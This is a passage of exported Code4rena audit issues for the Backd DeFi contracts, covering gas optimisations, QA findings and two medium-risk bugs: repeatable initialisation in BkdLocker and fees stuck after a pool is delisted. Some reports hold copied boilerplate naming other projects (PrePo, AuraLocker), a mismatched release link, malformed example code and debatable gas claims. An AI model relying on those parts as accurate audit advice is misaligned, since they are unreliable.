endtime_.uncheckedSub(starttime_); ``` A similar approach was implemented in the file below. File: StakerVault.sol [lines 229-230](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L229-L230)  ```         if (actionLockedBalances[account] > amount) {             actionLockedBalances[account] = actionLockedBalances[account].uncheckedSub(amount); ```   **Other Instances to modify** File:  VestedEscrow.sol [line 155](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L155) ```         uint256 elapsed = _time - startTime; ``` The above cannot underflow due to the check on [line 152](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L152) which ensures that time is greater than startTime ```         if (_time < startTime) {             return 0;         }         uint256 elapsed = _time - startTime;         return Math.min((locked * elapsed) / totalTime, locked); ```  This  ```uint256 elapsed = _time - startTime;```  should be changed to  ```uint256 elapsed = _time.uncheckedSub(startTime);```    File: StakerVault.sol  [line 124](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L124)  ```         balances[msg.sender] -= amount; ```  The above line cannot underflow due the check on [line 113](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L113) ```         require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); ``` The checks ensures that **balances[msg.sender]** is greater or equal to **amount** therefore balances[msg.sender]-amount will never underflow.   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/138", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Caching  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82 cache the value of `roles.length` before starting the loop to save gas  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L144 Use variable `length` instead of `stashedWithdraws.length` to save 1 SLOAD  ## !=0 is cheaper than >0 inside require staements https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L92 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L137 "}, {"title": "it's possible to initialize contract BkdLocker for multiple times by sending startBoost=0 and each time different values for other parameters", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/136", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L53-L64   # Vulnerability details  ## Impact function `initialize()` of `BkdLocker` suppose to be called one time and contract initialize one time. but if it's called by `startBoost=0` then it's possible to call it again with different values for other parameters. there are some logics based on the values function `initilize()` sets which is in calculating boost and withdraw delay. by initializing multiple times different users get different values for those logics and because rewards are distributed based on boosts so those logics will be wrong too.  ## Proof of Concept This is `initiliaze()` code in `BkdLocker`: ```     function initialize(         uint256 startBoost,         uint256 maxBoost,         uint256 increasePeriod,         uint256 withdrawDelay     ) external override onlyGovernance {         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);         _setConfig(_START_BOOST, startBoost);         _setConfig(_MAX_BOOST, maxBoost);         _setConfig(_INCREASE_PERIOD, increasePeriod);         _setConfig(_WITHDRAW_DELAY, withdrawDelay);     } ``` As you can see it checks the initialization statue by `currentUInts256[_START_BOOST]`'s value but it's not correct way to do and initializer can set `currentUInts256[_START_BOOST]` value as `0` and set other parameters values and call this function multiple times with different values for `_MAX_BOOST` and `_INCREASE_PERIOD` and `_WITHDRAW_DELAY`. setting different values for those parameters can cause different calculation in `computeNewBoost()` and `prepareUnlock()`. function `computeNewBoost()` is used to calculate users boost parameters which is used on reward distribution. so by changing `_MAX_BOOST` the rewards will be distributed wrongly between old users and new users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some other variable to check the status of initialization of contract.   "}, {"title": "Fees from delisted pool still in reward handler will become stuck after delisting", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/135", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L62-L76   # Vulnerability details  ## Impact Unclaimed fees from pool will be stuck  ## Proof of Concept When delisting a pool the pool's reference is removed from address provider:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L63  Burning fees calls a dynamic list of all pools which no longer contains the delisted pool:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39  Since the list no longer contains the pool those fees will not be processed and will remain stuck in the contract   ## Tools Used  ## Recommended Mitigation Steps Call burnFees() before delisting a pool  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/134", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# ISSUE LIST  ## C4-001 : Missing events for only functions that change critical parameters - Non Critical ## C4-002 : Critical changes should use two-step procedure - Non Critical ## C4-003 : Missing zero-address/values check in the constructor - Low ## C4-004 : The Contract Should approve(0) first ## C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens ## C4-006 : Contract should have pause/unpause functionality ## C4-007 : Front-runnable Initializers     # ISSUES  # C4-001 : Missing events for only functions that change critical parameters  ## Impact - Non critical  The afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.  Missing events and timelocks do not promote transparency and if such changes immediately affect users\u2019 perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.   ## Proof of Concept  1. Navigate to the following contract.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 ```  See similar High-severity H03 finding OpenZeppelin\u2019s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin\u2019s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)  ## Tools Used  None  ## Recommended Mitigation Steps  Add events to all functions that change critical parameters.   # C4-002 : Critical changes should use two-step procedure  ## Impact - NON CRITICAL  The critical procedures should be two step process.  ## Proof of Concept  1. Navigate to the following contract.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L50 ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.  # C4-003 : # Missing zero-address&values check in the constructor  ## Impact  Missing checks for zero-addresses&values may lead to infunctional protocol, if the variable addresses are updated incorrectly.  ## Proof of Concept  There are a few validations that could be added to the system:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L33  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L55  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L51  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Consider adding zero-address and zero value checks.  # C4-004 : The Contract Should approve(0) first  ## Impact  - LOW  Some tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.  ``` IERC20(token).safeApprove(address(operator), 0); IERC20(token).safeApprove(address(operator), amount); ```  ## Proof of Concept  1. Navigate to the following contracts.  ```   protocol/contracts/tokenomics/AmmConvexGauge.sol::61 => IERC20(ammToken).safeApprove(booster, type(uint256).max);   protocol/contracts/tokenomics/FeeBurner.sol::118 => IERC20(token_).safeApprove(spender_, type(uint256).max);  ```  2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.  ## Tools Used  None  ## Recommended Mitigation Steps  Approve with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.   # C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens  ## Impact -  LOW  PrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.  ## Proof of Concept  1. Navigate to the following contract.  ``` protocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for \"airdropped\" reward token protocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom( protocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); protocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_); protocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for \"airdropped\" reward token protocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable); protocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ```  ## Tools Used  Manual Code Review  ## Recommended Mitigation Steps  - Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation - Add support in contracts for such tokens before accepting user-supplied tokens - Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.   # C4-006 : Contract should have pause/unpause functionality  ## Impact  In case a hack is occuring or an exploit is discovered, the team should be able to pause functionality until the necessary changes are made to the system. Additionally, the AuraLocker.sol contract should be manged by proxy so that upgrades can be made by the owner.  To use a thorchain example again, the team behind thorchain noticed an attack was going to occur well before the system transferred funds to the hacker. However, they were not able to shut the system down fast enough. (According to the incidence report here: https://github.com/HalbornSecurity/PublicReports/blob/master/Incident%20Reports/Thorchain_Incident_Analysis_July_23_2021.pdf)   ## Proof of Concept  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L249   ## Tools Used  Code Review  ## Recommended Mitigation Steps  Pause functionality on the contract would have helped secure the funds quickly.   # C4-007 : Front-runnable Initializers  ## Impact - LOW  All contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.   ## Proof of Concept  1. Navigate to the following contracts.  ``` protocol/contracts/BkdLocker.sol:53:    function initialize( protocol/contracts/LpToken.sol:28:    function initialize( protocol/contracts/StakerVault.sol:71:    function initialize(address _token) external override initializer {  ```  2. initialize functions does not have access control. They are vulnerable to front-running.  ## Tools Used  Manual Code Review  ## Recommended Mitigation Steps  While the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "### [G-01] Unnecessary check for positive value  #### Description  A `uint256` value can not be negative, hence there is no need to check for it.  #### Findings  [tokenomics/InflationManager.sol#L589](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L589)  ```solidity totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0; ```  [tokenomics/InflationManager.sol#L602](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L602)  ```solidity totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ```  [tokenomics/InflationManager.sol#L575](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L575)  ```solidity totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0; ```  #### Recommended mitigation steps  Remove the check and use the value directly to save gas.  ### [G-02] Unnecessary `poolCheckpoint` function call  The `AmmGauge` and `KeeperGauge` contracts call the function `poolCheckpoint()` within the `kill()` function. Therefore, functions which call this `kill()` function do not have to additionally call the `poolCheckpoint()` function.  #### Description  A `uint256` value can not be negative, hence there is no need to check for it.  #### Findings  [tokenomics/InflationManager.sol#L427](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L427)\\ [tokenomics/InflationManager.sol#L461](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L461)  #### Recommended mitigation steps  Remove the call to `poolCheckpoint()` to save gas. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "#1 Immutable  Impact the state can't be initialize  by constructor.  Proof Of Concept  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L35  Tool Used Manual Review  Recommended Mitigation Steps the state must add immutable because in the constructor parameter mention fundAdmin to initialize. so i suggest to add immutable on it.      address public fundAdmin; to      address public immutable fundAdmin;  #2 Typo  Impact missleading  Proof of Concept https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173  Tools Used manual review  Recommended Mitigation Steps fix the typo to increase readibility. fix it from        * @dev This does not invlude the gov. tokens queued for withdrawal. to       * @dev This does not includes the gov. tokens queued for withdrawal. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/129", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## C4-001: Revert String Size Optimization ## C4-002 : Adding unchecked directive can save gas ## C4-003 : Check if amount > 0 before token transfer can save gas ## C4-004 : There is no need to assign default values to variables ## C4-005 : Free gas savings for using solidity 0.8.10+ ## C4-006 : Using operator && used more gas ## C4-007 : Non-strict inequalities are cheaper than strict ones ## C4-008 : Use Custom Errors instead of Revert Strings to save Gas ## C4-009 : Use Shift Right/Left instead of Division/Multiplication if possible ## C4-010 : Cache array length in for loops can save gas ## C4-011 : State Variables that can be changed to immutable ## C4-012 : Use calldata instead of memory for function parameters   # C4-001: Revert String Size Optimization  ## Impact  Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   ## Proof of Concept  Revert strings > 32 bytes are here:  ```   ../2022-05-backd-main/protocol/libraries/Errors.sol::11 => string internal constant CONTRACT_INITIALIZED = \"contract can only be initialized once\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::18 => string internal constant INVALID_TOKEN = \"token address does not match pool's LP token address\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::21 => string internal constant INVALID_PARAMETER_VALUE = \"invalid parameter value attempted\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::22 => string internal constant INVALID_IMPLEMENTATION = \"invalid pool implementation for given coin\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::24 => \"invalid pool implementation for given coin\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::26 => \"invalid LP Token implementation for given coin\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::28 => \"invalid vault implementation for given coin\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::30 => \"invalid stakerVault implementation for given coin\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::33 => string internal constant INSUFFICIENT_AMOUNT_OUT = \"Amount received less than min amount\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::34 => string internal constant INSUFFICIENT_AMOUNT_IN = \"Amount spent more than max amount\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::47 => string internal constant THRESHOLD_TOO_HIGH = \"threshold is too high, must be under 10\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::51 => string internal constant CANNOT_EXECUTE_IN_SAME_BLOCK = \"cannot execute action in same block\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::57 => \"not enough funds were withdrawn from the pool\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::63 => string internal constant ERC20_BALANCE_EXCEEDED = \"ERC20: transfer amount exceeds balance\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::65 => \"the minter address of the LP token and the pool address do not match\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::66 => string internal constant STAKER_VAULT_EXISTS = \"a staker vault already exists for the token\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::70 => string internal constant DEADLINE_NOT_REACHED = \"deadline has not been reached yet\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::73 => \"insufficient funds for updating the position\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::74 => string internal constant SAME_AS_CURRENT = \"value must be different to existing value\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::80 => string internal constant ESTIMATED_GAS_TOO_HIGH = \"too much ETH will be used for gas\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::84 => string internal constant GAS_BANK_BALANCE_TOO_LOW = \"not enough ETH in gas bank to cover gas\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::89 => \"pool does not support additional underlying coins to be withdrawn\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::95 => string internal constant TOKEN_NOT_USABLE = \"token not usable for the specific action\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::99 => string internal constant POOL_NOT_PAUSED = \"Pool must be paused to withdraw from reserve\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::100 => string internal constant INTERACTION_LIMIT = \"Max of one deposit and withdraw per block\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::103 => string internal constant EXCEEDS_MAX_BOOST = \"Not allowed to exceed maximum boost on Convex\";   ../2022-05-backd-main/protocol/libraries/Errors.sol::105 => \"Cannot relock funds when withdrawal is being prepared\"; ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Shorten the revert strings to fit in 32 bytes. That will affect gas optimization.  # C4-002 : Adding unchecked directive can save gas  ## Impact  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  ## Proof of Concept  ```   ../2022-05-backd-main/protocol/contracts/zaps/PoolMigrationZap.sol::22 => for (uint256 i; i < newPools_.length; ++i) {  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider applying unchecked arithmetic where overflow/underflow is not possible. Example can be seen from below.  ``` Unchecked{i++}; ```  # C4-003 : Check if amount > 0 before token transfer can save gas  ## Impact  Since _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.  ## Proof of Concept  ``` ./protocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for \"airdropped\" reward token ./protocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom( ./protocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ./protocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_); ./protocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for \"airdropped\" reward token ./protocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable); ./protocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ```  All Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  Consider checking amount != 0.  # C4-004 : There is no need to assign default values to variables  ## Impact -  Gas Optimization  Boolean is default initialized to false. There is no need assign false to variable.   ## Proof of Concept  ```   protocol/contracts/tokenomics/InflationManager.sol::412 => bool keeperGaugeExists = false;   ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  bool x = false costs more gas than bool x without having any different functionality.   # C4-005 : Free gas savings for using solidity 0.8.13+  ## Impact  Using newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.  ## Proof of Concept  ``` All Contracts ```   Solidity 0.8.14 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/  Solidity 0.8.13 has some improvements too but not well tested.  Code Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist  All Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to upgrade pragma to at least 0.8.13.   # C4-006 : Using operator && used more gas  ## Impact  Using double require instead of operator && can save more gas.  ## Proof of Concept  1. Navigate to the following contracts.  ``` protocol/contracts/tokenomics/AmmConvexGauge.sol:73:        if (amount <= 0 && crvAmount <= 0 && cvxAmount <= 0) return 0; protocol/contracts/tokenomics/AmmConvexGauge.sol:107:        if (!killed && totalStaked > 0) { protocol/contracts/tokenomics/AmmConvexGauge.sol:129:        if (!killed && totalStaked > 0) { protocol/contracts/tokenomics/InflationManager.sol:420:        if (!keeperGaugeExists && weightBasedKeeperDistributionDeactivated && length >= 1) { protocol/contracts/tokenomics/InflationManager.sol:426:        if (exists && !IKeeperGauge(keeperGauge).killed()) { protocol/contracts/tokenomics/AmmGauge.sol:88:        if (!killed && totalStaked > 0) {   ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Example  ```  using &&:  function check(uint x)public view{ require(x == 0 && x < 1 ); } // gas cost 21630  using double require:  require(x == 0 ); require( x < 1); } } // gas cost 21622 ```   # C4-007 : Non-strict inequalities are cheaper than strict ones  ## Impact  Strict inequalities add a check of non equality which costs around 3 gas.  ## Proof of Concept  ```   protocol/contracts/BkdLocker.sol::91 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/BkdLocker.sol::92 => require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);   protocol/contracts/BkdLocker.sol::137 => require(length > 0, \"No entries\");   protocol/contracts/BkdLocker.sol::139 => while (i > 0) {   protocol/contracts/BkdLocker.sol::254 => if (userBalance > 0) {   protocol/contracts/BkdLocker.sol::301 => if (userBalance > 0) {   protocol/contracts/CvxCrvRewardsLocker.sol::174 => if (cvxcrvBal > 0) {   protocol/contracts/CvxCrvRewardsLocker.sol::268 => if (IERC20(CVX_CRV).balanceOf(address(this)) > 0)   protocol/contracts/LpToken.sol::87 => if (amount > 0) ILiquidityPool(minter).handleLpTokenTransfer(from, to, amount); // add check to not break 0 transfers   protocol/contracts/RewardHandler.sol::63 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpAction.sol::57 => if (depositAmount > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::67 => if (lockAmount > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::103 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpAction.sol::214 => require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT);   protocol/contracts/actions/topup/TopUpAction.sol::535 => require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);   protocol/contracts/actions/topup/TopUpAction.sol::655 => if (position.depositTokenBalance > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::866 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpActionFeeHandler.sol::123 => require(totalClaimable > 0, Error.NOTHING_TO_CLAIM);   protocol/contracts/actions/topup/handlers/AaveHandler.sol::62 => if (variableDebt + stableDebt > 0) {   protocol/contracts/actions/topup/handlers/AaveHandler.sol::84 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/handlers/CompoundHandler.sol::137 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/pool/LiquidityPool.sol::469 => require(underlyingAmount > 0, Error.INVALID_AMOUNT);   protocol/contracts/pool/LiquidityPool.sol::471 => require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE);   protocol/contracts/pool/LiquidityPool.sol::514 => require(mintedLp >= minTokenAmount && mintedLp > 0, Error.INVALID_AMOUNT);   protocol/contracts/pool/LiquidityPool.sol::538 => require(redeemLpTokens > 0, Error.INVALID_AMOUNT);   protocol/contracts/strategies/BkdEthCvx.sol::105 => if (stakedBalance > 0) {   protocol/contracts/strategies/BkdEthCvx.sol::111 => if (lpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::154 => if (underlyingBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::162 => if (hopLpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::214 => if (hopLpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::361 => if (stakedBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::367 => if (lpBalance > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::410 => if (cvxCommunityReserveShare_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::413 => if (cvxBalance_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::421 => if (crvCommunityReserveShare_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::424 => if (crvBalance_ > 0) {   protocol/contracts/swappers/SwapperRouter.sol::264 => if (IERC20(token_).allowance(address(this), spender_) > 0) return;   protocol/contracts/testing/MockErc20Strategy.sol::64 => require(currentBalance > 0, \"Invalid amount to withdraw\");   protocol/contracts/testing/MockErc20Strategy.sol::74 => require(amount > 0, \"Invalid amount to transfer\");   protocol/contracts/testing/MockEthStrategy.sol::65 => require(currentBalance > 0, \"Invalid amount to withdraw\");   protocol/contracts/testing/MockVotingEscrow.sol::35 => require(_balances[msg.sender] > 0, \"a lock needs to first be created\");   protocol/contracts/tokenomics/AmmConvexGauge.sol::107 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmConvexGauge.sol::129 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmConvexGauge.sol::158 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmConvexGauge.sol::171 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmConvexGauge.sol::197 => if (totalStaked > 0) {   protocol/contracts/tokenomics/AmmGauge.sol::88 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmGauge.sol::104 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmGauge.sol::125 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmGauge.sol::147 => if (totalStaked > 0) {   protocol/contracts/tokenomics/FeeBurner.sol::117 => if (IERC20(token_).allowance(address(this), spender_) > 0) return;   protocol/contracts/tokenomics/InflationManager.sol::575 => totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;   protocol/contracts/tokenomics/InflationManager.sol::589 => totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;   protocol/contracts/tokenomics/InflationManager.sol::602 => totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;   protocol/contracts/tokenomics/KeeperGauge.sol::140 => require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);   protocol/contracts/tokenomics/LpGauge.sol::68 => if (poolTotalStaked > 0) {   protocol/contracts/tokenomics/LpGauge.sol::114 => if (poolTotalStaked > 0) {   protocol/contracts/tokenomics/VestedEscrow.sol::84 => require(unallocatedSupply > 0, \"No reward tokens in contract\");   protocol/contracts/vault/Vault.sol::163 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/vault/Vault.sol::231 => if (remainingStrategyBalance > 0) {   protocol/contracts/vault/Vault.sol::466 => if (strategistShare > 0) {   protocol/contracts/vault/Vault.sol::609 => if (currentDebt > 0) {   protocol/contracts/vault/Vault.sol::638 => if (strategistShare > 0) {   protocol/contracts/vault/Vault.sol::711 => if (govShare > 0) {   protocol/contracts/vault/Vault.sol::727 => } else if (underlyingReserves > 0) { ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Use >= or <= instead of > and < when possible.   # C4-008 : Use Custom Errors instead of Revert Strings to save Gas   Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Instances include:  All require Statements  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Recommended to replace revert strings with custom errors.   # 